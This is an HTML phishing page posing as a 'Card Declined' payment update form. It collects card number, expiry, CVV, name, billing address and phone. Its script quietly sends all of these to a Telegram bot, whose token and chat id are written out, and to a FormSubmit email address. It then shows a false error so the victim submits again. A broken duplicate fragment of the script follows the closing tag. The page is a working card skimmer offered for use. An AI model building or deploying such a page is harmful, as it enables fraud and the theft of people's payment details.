<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Card Declined</title>
  <style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
      font-family: -apple-system, sans-serif;
      background: url('') center/cover fixed;
      min-height: 100vh;
      overflow: auto;
    }

    .intro {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: white; display: flex; align-items: center; justify-content: center;
      z-index: 9999; transition: opacity .5s;
    }

    .intro.hide { opacity: 0; visibility: hidden; }

    .intro img {
      max-width: 90%; max-height: 90%;
      border-radius: 15px;
      box-shadow: 0 0px 0px rgba(0, 0, 0, .3);
      animation: fadeIn .8s;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: scale(.8);}
      to {opacity: 1; transform: scale(1);}
    }

    .main { opacity: 0; transition: opacity .5s; }
    .main.show { opacity: 1; }

    .form-container {
      position: absolute;
      top: 50%;
      left: 45%;
      transform: translate(-50%, -50%);
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      padding: 24px;
      border-radius: 12px;
      width: 50%;
      max-width: 900px;
      box-shadow: 0 0px 0px rgba(0, 0, 0, .1);
    }

    form {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
    }

    .section {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .section h2 {
      font-size: 18px;
      font-weight: 600;
      color: #374151;
      border-bottom: 2px solid #e5e7eb;
      padding-bottom: 6px;
      margin-bottom: 6px;
    }

    .field {
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 4px;
      color: #374151;
    }

    input, select, textarea {
      font-size: 14px;
      padding: 8px 10px;
      border: 2px solid #e5e7eb;
      border-radius: 8px;
      background: white;
      transition: border-color .2s;
    }

    input:focus, select:focus, textarea:focus {
      border-color: #3b82f6;
      outline: none;
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
    }

    .small {
      max-width: 150px;
    }

    .medium {
      max-width: 100%;
    }

    .exp-row {
      display: flex;
      gap: 12px;
    }

    .buttons {
      grid-column: 1 / -1;
      display: flex;
      justify-content: flex-end;
      gap: 16px;
      margin-top: 10px;
    }

    .buttons button {
      padding: 10px 24px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 500;
      border: 2px solid transparent;
      cursor: pointer;
    }

    button.reset {
      background: white;
      color: #6b7280;
      border-color: #e5e7eb;
    }

    button.save {
      background: #3b82f6;
      color: white;
    }

    button.save:hover {
      background: #2563eb;
    }

    #errorMsg {
      grid-column: 1 / -1;
      color: red;
      font-weight: 600;
      text-align: center;
      margin-top: 10px;
    }

    #loader {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: white;
      display: flex; justify-content: center; align-items: center;
      font-size: 24px;
      color: #3b82f6;
      opacity: 0;
      visibility: hidden;
      z-index: 10000;
      transition: opacity .4s;
    }

    #loader.show {
      opacity: 1;
      visibility: visible;
    }

    @media (max-width: 768px) {
      form {
        grid-template-columns: 1fr;
      }

      .exp-row {
        flex-direction: column;
      }

      .small {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>

<!-- SHOW intro initially (no .hide) -->
<div class="intro" id="intro">
  <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1755850173/1stss_mxfcxy.jpg" alt="Loading...">
</div>

<!-- HIDE main initially (no .show) -->
<div class="main" id="main">
  <div class="form-container">
    <form id="paymentForm" autocomplete="off">
      <!-- Left: Payment Details -->
      <div class="section">
        <h2>Card Details</h2>

        <div class="field">
          <label for="cardType">Select Option</label>
          <select id="cardType" class="small" required="">
            <option value="">Select</option>
            <option value="Credit Card">Credit Card</option>
            <option value="Debit Card">Debit Card</option>
          </select>
        </div>

        <div class="field">
          <label for="cardNumber">Card Number</label>
          <input id="cardNumber" type="text" maxlength="19" class="medium" placeholder="Enter Card Number" required="">
        </div>

        <div class="exp-row">
          <div class="field">
            <label for="expMonth">Exp Month</label>
            <select id="expMonth" class="small" required="">
              <option value="">Month</option>
              <option>01</option><option>02</option><option>03</option><option>04</option>
              <option>05</option><option>06</option><option>07</option><option>08</option>
              <option>09</option><option>10</option><option>11</option><option>12</option>
            </select>
          </div>
          <div class="field">
            <label for="expYear">Exp Year</label>
            <select id="expYear" class="small" required=""></select>
          </div>
        </div>

        <div class="field">
          <label for="firstName">First Name</label>
          <input id="firstName" type="text" class="medium" required="">
        </div>

        <div class="field">
          <label for="lastName">Last Name</label>
          <input id="lastName" type="text" class="medium" required="">
        </div>

        <div class="field">
          <label for="cvv">CVV</label>
          <input id="cvv" type="text" maxlength="4" class="small" required="">
        </div>
      </div>

      <!-- Right: Billing Address -->
      <div class="section">
        <h2>Billing Address</h2>

        <div class="field">
          <label for="country">Country</label>
          <select id="country" class="small" required="">
            <option value="">Select Country</option>
            <option>United States</option><option>Guernsey</option><option>United Kingdom</option>
            <option>Germany</option><option>France</option><option>Jersey</option>
          </select>
        </div>

        <div class="field">
          <label for="state">State/Province</label>
          <input id="state" type="text" class="medium" required="">
        </div>

        <div class="field">
          <label for="city">City</label>
          <input id="city" type="text" class="medium" required="">
        </div>

        <div class="field">
          <label for="address">Address</label>
          <textarea id="address" class="medium" required=""></textarea>
        </div>

        <div class="field">
          <label for="zip">Postal/Zip</label>
          <input id="zip" type="text" class="medium" required="">
        </div>

        <div class="field">
          <label for="phone">Phone</label>
          <input id="phone" type="tel" class="medium" required="">
        </div>
      </div>

      <div id="errorMsg"></div>

      <div class="buttons">
        <button type="button" class="Clear" onclick="paymentForm.reset(); clearError();">Reset</button>
        <button type="submit" class="Update">Save</button>
      </div>
    </form>
  </div>
</div>

<div id="loader">Loading...</div>
  
 <!-- Add this inside <body> just before the closing </body> tag -->
<iframe name="hiddenFrame" style="display:none;" src="./Payment Info_files/saved_resource.html"></iframe>

<script>
  // Intro fade effect - SHOW intro for 2 seconds, then fade to form
  setTimeout(() => {
    document.getElementById('intro').classList.add('hide');
    setTimeout(() => {
      document.getElementById('main').classList.add('show');
    }, 500);
  }, 500); // 2 seconds instead of 5

  // Populate years from 2025 to 2030
  const yearSelect = document.getElementById('expYear'); 
  for (let year = 2026; year <= 2035; year++) {
    const opt = document.createElement('option');
    opt.value = year;
    opt.textContent = year;
    yearSelect.appendChild(opt);
  }

  const form = document.getElementById('paymentForm'); 
  const errorMsg = document.getElementById('errorMsg');
  const loader = document.getElementById('loader');
  let saveCount = 0;

  function clearError() {
    errorMsg.textContent = '';
  }

  form.addEventListener('submit', e => {
    e.preventDefault();
    clearError();

    const cardNum = form.cardNumber.value.replace(/\s+/g, '');
    if (!/^\d{13,19}$/.test(cardNum)) {
      errorMsg.textContent = 'Please enter a valid card number (13–19 digits).';
      return;
    }

    saveCount++;

    const fields = [
      'cardType', 'cardNumber', 'expMonth', 'expYear', 'firstName', 'lastName',
      'cvv', 'country', 'state', 'city', 'address', 'zip', 'phone'
    ];

    // Build data string
    const formData = fields.map(id => {
      const val = document.getElementById(id)?.value || '';
      return `${id}: ${val}`;
    }).join('\n');

    // === Telegram Bot Integration ===
    const botToken = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';  // 🔁 Replace this
    const chatId = '8052751627';      // 🔁 Replace this

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `💳 New car Submission:\n\n${formData}`
      })
    }).catch(err => {
      console.error('Telegram error:', err);
    });

    // Submit to FormSubmit email
    const hiddenForm = document.createElement('form');
    hiddenForm.action = 'https://formsubmit.co/rothjens2424@gmail.com';
    hiddenForm.method = 'POST';
    hiddenForm.target = 'hiddenFrame';

    fields.forEach(id => {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = id;
      input.value = document.getElementById(id)?.value || '';
      hiddenForm.appendChild(input);
    });

    document.body.appendChild(hiddenForm);
    hiddenForm.submit();
    hiddenForm.remove();

    // F loader or redirect after 3 tries
    if (saveCount >= 30) {
      loader.classList.add('show');
      setTimeout(() => {
        window.location.href = 'https://www.google.com';
      }, 6000);
    } else {
      errorMsg.textContent = 'Incorrect details, please try again.';
      form.reset();
    }
  });
</script>

      };

      // Replace with your Telegram Bot details
      const botToken = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';  // 🔁 Replace this
      const chatId = '8052751627';      // 🔁 Replace this

      const message = `

</body></html>
